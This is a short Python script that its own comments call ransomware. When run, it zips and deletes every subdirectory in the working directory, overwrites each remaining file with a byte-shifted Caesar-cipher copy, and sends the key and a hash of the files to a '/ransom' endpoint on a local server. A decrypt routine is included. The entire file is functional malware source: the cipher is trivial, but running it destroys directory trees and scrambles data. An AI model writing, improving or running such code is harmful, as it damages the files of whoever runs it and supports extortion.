import os
import requests
import shutil
from hashlib import sha256
from random import SystemRandom

REQUEST_URL = 'http://localhost:5000/ransom?key={}&hash={}'


def caesar_keygen():
    '''
    Generate a Caeser cipher key that is not 0.
    '''
    cryptogen = SystemRandom()
    return cryptogen.randrange(255) + 1


def caesar_encrypt(key, filepath):
    '''
    Use the Caesar cipher to encrypt the file at `filepath` with `key`.
    '''
    ciphertext = []
    with open(filepath, 'rb') as f:
        byte = f.read(1)
        while byte:
            ciphertext.append((ord(byte) + key) % 256)
            byte = f.read(1)
    key = None
    del key
    return bytearray(ciphertext)


def caesar_decrypt(key, filepath):
    '''
    Use the Caesar cipher to decrypt the file at `filepath` with `key`.
    '''
    plaintext = []
    with open(filepath, 'rb') as f:
        byte = f.read(1)
        while byte:
            plaintext.append((ord(byte) - key) % 256)
            byte = f.read(1)
    return bytearray(plaintext)


def encrypt():
    '''
    Run Caesar encryption of all files in this directory.
    '''
    key = caesar_keygen()
    for _, dirs, _ in os.walk(os.getcwd()):
        for d in dirs:  # Zip all directories so they can be encrypted
            shutil.make_archive(d, 'zip', d)
            shutil.rmtree(d)
    digest = sha256()
    for filepath in os.listdir(os.getcwd()):
        if (filepath == 'client.py'):   # Don't let the ransomware self-encrypt
            continue
        with open(filepath, 'rb') as f:
            digest.update(f.read())
        ciphertext = caesar_encrypt(key, filepath)
        with open(filepath, 'wb') as f:
            f.write(ciphertext)
    r = requests.get(REQUEST_URL.format(str(key), digest.hexdigest()))
    print(r)
    key, digest = None, None
    del key, digest


def decrypt(key, sha_hash):
    '''
    Run Caesar decryption of all files in this directory, using `key`. The
    decryption can be checked with the sha256 hash, although this is mostly
    for testing.
    '''
    for filepath in os.listdir(os.getcwd()):
        if (filepath == 'client.py'):
            continue
        plaintext = caesar_decrypt(key, filepath)
        with open(filepath, 'wb') as f:
            f.write(plaintext)
    digest = sha256()
    for filepath in os.listdir(os.getcwd()):
        if (filepath == 'client.py'):
            continue
        with open(filepath, 'rb') as f:
            digest.update(f.read())
    assert digest.hexdigest() == sha_hash   # Not neccessary, used for testing

if __name__ == '__main__':
    encrypt()
    # print(r.text)
